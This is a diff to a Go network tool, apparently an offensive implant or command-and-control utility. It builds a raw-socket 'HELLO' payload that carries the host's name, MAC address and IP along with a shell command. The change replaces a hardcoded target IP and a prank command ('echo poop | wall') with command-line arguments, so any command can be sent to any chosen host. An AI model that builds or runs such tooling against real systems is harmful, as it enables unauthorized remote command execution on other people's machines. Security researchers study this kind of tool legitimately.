@@ -350,7 +350,7 @@ func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
 		log.Fatal("Hostname not found...")
 	}
 	
-	hello = "HELLO:" + "#" + hostname + "#" + hostMAC.String() + "#" + srcIP.String() + "#"  + "echo poop | wall" 
+	hello = "HELLO:" + "#" + hostname + "#" + hostMAC.String() + "#" + srcIP.String() + "#"  + os.Args[2] 
 	fmt.Println("[+] Payload Created:", hello)
 
 	return hello
@@ -435,6 +435,19 @@ func execCommand(command string) {
 }
 
 func main() {
+	
+	//Vaidate parameters
+	if len(os.Args) < 3 {
+        	fmt.Println("Usage: myprogram <ip address> \"<command>\"")
+       	 	os.Exit(1)
+   	 }
+	
+	// Check for valid IP
+	ip := net.ParseIP(os.Args[1])
+	if ip == nil {
+        	fmt.Println("Invalid IP address:", os.Args[1])
+        	os.Exit(1)
+    	}
 
 	// Create BPF filter vm
 	vm := CreateBPFVM(FilterRaw)
@@ -446,7 +459,9 @@ func main() {
 	fmt.Println("[+] Socket created")
 
 	// Get information that is needed for networking
-	iface, src := GetOutwardIface("172.25.41.11:80")
+	
+	tmp := os.Args[1]+":80"
+	iface, src := GetOutwardIface(tmp)
 	fmt.Println("[+] Using interface:", iface.Name)
 
 	dstMAC, err := GetRouterMAC(iface.Name)
@@ -466,7 +481,7 @@ func main() {
         	return
     	}
 */
-	go sendHello(iface, src, net.IPv4(172, 25, 41, 11), dstMAC)
+	go sendHello(iface, src, net.IPv4(ip[12], ip[13], ip[14], ip[15]), dstMAC)
 
 	// Listen for responses
 	fmt.Println("[+] Listening")
